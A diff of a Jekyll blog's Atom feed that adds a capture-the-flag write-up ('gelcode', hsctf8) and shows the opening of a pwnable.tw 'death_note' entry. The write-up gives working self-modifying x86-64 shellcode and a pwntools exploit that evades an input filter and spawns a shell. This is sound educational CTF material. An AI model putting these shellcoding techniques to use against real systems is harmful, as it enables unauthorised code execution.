@@ -1,4 +1,99 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-05-30T22:40:36+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">k1R4’s blog</title><subtitle>Welcome to k1R4's blog!</subtitle><entry><title type="html">death_note [pwnable.tw]</title><link href="http://localhost:4000/pwn/2021/05/30/death_note.html" rel="alternate" type="text/html" title="death_note [pwnable.tw]" /><published>2021-05-30T19:45:00+05:30</published><updated>2021-05-30T19:45:00+05:30</updated><id>http://localhost:4000/pwn/2021/05/30/death_note</id><content type="html" xml:base="http://localhost:4000/pwn/2021/05/30/death_note.html">&lt;h1 id=&quot;death_note-pwnabletw-&quot;&gt;death_note [pwnable.tw] &lt;br /&gt;&lt;br /&gt;&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-06-26T22:37:44+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">k1R4’s blog</title><subtitle>Welcome to k1R4's blog!</subtitle><entry><title type="html">gelcode [hsctf8]</title><link href="http://localhost:4000/pwn/2021/06/26/gelcode.html" rel="alternate" type="text/html" title="gelcode [hsctf8]" /><published>2021-06-26T14:30:00+05:30</published><updated>2021-06-26T14:30:00+05:30</updated><id>http://localhost:4000/pwn/2021/06/26/gelcode</id><content type="html" xml:base="http://localhost:4000/pwn/2021/06/26/gelcode.html">&lt;h1 id=&quot;gelcode-&quot;&gt;gelcode &lt;br /&gt;&lt;br /&gt;&lt;/h1&gt;
+
+&lt;p&gt;Ah yes another shellcoding challenge! It seems impossible at first glance. ASCII value of our input is required to be less than 0xf, or its replaced with a null byte.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/gelcode/decompilation.png&quot; alt=&quot;decompilation_of_main&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So to workaround this constraint we will be writing self-modifying shellcode. But first, here is the register state we are working with:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/gelcode/regstate.png&quot; alt=&quot;register_state&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Our aim here is to do a read syscall on our input buffer, so we can give execve shellcode without contrainst. To do that we need to set rdi to 0 (stdin) and rdx to a small value so that we dont go beyond the heap boundary which will fail the syscall. Analysing all possible instructions with depth 3, these seem rather interesting:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add     DWORD PTR [rdx+rax*1], eax
+add     al,0x(0-f)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;With this we can modify our input but the problem is we can add only the index of our input byte to itself. To workarond that we will be using these:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add    BYTE PTR [rdx+rax*1], cl
+add    cl, BYTE PTR [rdx+rax*1]&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This gives us independent control over index and value that is added to our input bytes. But since the value of cl is not what we want, we first have to write shellcode that modifies itself to perform &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor rcx,rcx&lt;/code&gt;. After a bit of head scratching and some quick maths, we have ourselves shellcode to perform, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor rcx,rcx&lt;/code&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;shell1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+    add     al,0xf
+    add     al,0xf
+    add     al,0x6
+    add     DWORD PTR [rdx+rax*1], eax 
+    add     DWORD PTR [rdx+rax*1], eax
+    add     al,0x1
+    add     DWORD PTR [rdx+rax*1], eax
+    
+    add     al,0x1
+    add     DWORD PTR [rdx+rax*1], eax 
+    add     DWORD PTR [rdx+rax*1], eax
+    add     DWORD PTR [rdx+rax*1], eax 
+    add     DWORD PTR [rdx+rax*1], eax
+    add     DWORD PTR [rdx+rax*1], eax
+    add     al,0xf
+    &quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x0c\x0b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now our aim is to get the shellcode to do the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xor rdi,rdi
+mov rdx, 0x500
+xor eax,eax
+syscall&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Since rsi is already set, this will result in a read syscall.
+Next we have to set cl to a value that makes it easier for us, since every byte that we want can be represented as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x18*n+0x(0-f)&lt;/code&gt;, we shall set cl to 0x18 then use the add instruction multiple times until we get our desired byte. The remainder of the byte is directly given as input. Now time to set cl and spam add instructions xD. To keep the writeup short, I shall be appending (x N) at the end of add instructions to the amount of adds used.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;shell2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+    add    al,0x6
+    add    cl, BYTE PTR [rdx+rax*1] (x 6)
+    add    al,0xf (x 11)
+
+    add    al,0x5
+    add    BYTE PTR [rdx+rax*1], cl (x 3)
+
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 2)
+
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 10)
+    
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 3)
+
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 8)
+    
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 8)
+    
+    add    al,0x5
+    add    BYTE PTR [rdx+rax*1], (cl x 2)
+
+    add    al,0x1
+    add    BYTE PTR [rdx+rax*1], (cl x 8)
+    &quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x01\x0f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00\x07\x02\x00\x05\x00\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x01\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;syscall&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now time to finish the exploit:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell2&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;999&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;sl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;sl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;243&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcraft&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;</content><author><name></name></author><category term="pwn" /><summary type="html">gelcode</summary></entry><entry><title type="html">death_note [pwnable.tw]</title><link href="http://localhost:4000/pwn/2021/05/30/death_note.html" rel="alternate" type="text/html" title="death_note [pwnable.tw]" /><published>2021-05-30T19:45:00+05:30</published><updated>2021-05-30T19:45:00+05:30</updated><id>http://localhost:4000/pwn/2021/05/30/death_note</id><content type="html" xml:base="http://localhost:4000/pwn/2021/05/30/death_note.html">&lt;h1 id=&quot;death_note-pwnabletw-&quot;&gt;death_note [pwnable.tw] &lt;br /&gt;&lt;br /&gt;&lt;/h1&gt;
 &lt;p&gt;The binary given is a 32-bit ELF. Here is its checksec output:&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/images/death_note/checksec.png&quot; alt=&quot;checksec-output&quot; /&gt;&lt;/p&gt;
